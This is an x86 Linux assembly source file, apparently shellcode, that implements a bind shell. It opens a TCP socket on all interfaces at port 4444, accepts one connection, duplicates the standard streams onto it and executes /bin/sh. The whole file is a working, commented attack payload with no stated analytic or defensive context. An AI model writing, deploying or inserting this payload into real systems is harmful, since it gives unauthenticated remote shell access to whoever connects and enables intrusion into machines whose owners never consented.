section .text
global _start

_start:
	xor eax, eax
	mov al, 0x66	; eax = 0x66 (sys_socketcall)
	
	xor ebx, ebx
	inc ebx		; ebx = 0x1 (SYS_SOCKET)
	
	xor esi, esi	; esi = 0x0
	push esi	; 0 = IPPROTO_IP
	push ebx	; 1 = SOCK_STREAM
	push 0x2	; 2 = AF_INET

	mov ecx, esp	; ecx = args array structure
	int 0x80	; syscall

	xchg edi, eax	; save the file descriptor returned to eax in edi

	xor eax, eax
	mov al, 0x66

	push esi	; esi = 0 => 0.0.0.0
	push word 0x5C11; Port 4444

	inc ebx		; ebx = 2 (SYS_BIND)
	push bx

	mov ecx, esp	; ecx = args array structure

	push byte 16	; addrlen
	push ecx	; addr
	push edi	; socketfd
	mov ecx, esp	; ecx = args array for the syscall

	int 0x80	; syscall

	xor eax, eax
	xor ebx, ebx
	mov al, 0x66
	mov bl, 0x4	;  bl = 4 (SYS_LISTEN)

	push esi	; backlog = 0
	push edi	; sockfd
	mov ecx, esp	; move args to ecx
	int 0x80	; syscall

	mov al, 0x66
	inc ebx		; ebx = 5 (SYS_ACCEPT)
	push esi	; NULL
	push esi	; NULL
	push edi	; sockfd
	mov ecx, esp	; move args to ecx
	int 0x80	; syscall

	xchg ebx, eax	; save the file descriptor in ebx

	xor ecx, ecx	; clear ecx
	mov cl, 0x2	; loop counter

	loop:
	  mov al, 0x3f	; al = 0x3f (sys_dup2)
	  int 0x80	; syscall
	  dec ecx	; decrement ecx (arg for the file descriptor)
	  jns loop

	mov al, 0x0B	; al = = 0x0b (sys_execve)
	push esi	; 0 = string terminator
	push dword 0x68732f2f ; //sh
	push dword 0x6e69622f ; /bin
	mov ebx, esp

	push esi
	push ebx
	mov ecx, esp	; argv = [ filename, 0 ]
	mov edx, esi	; envp = NULL

	int 0x80 ; syscall
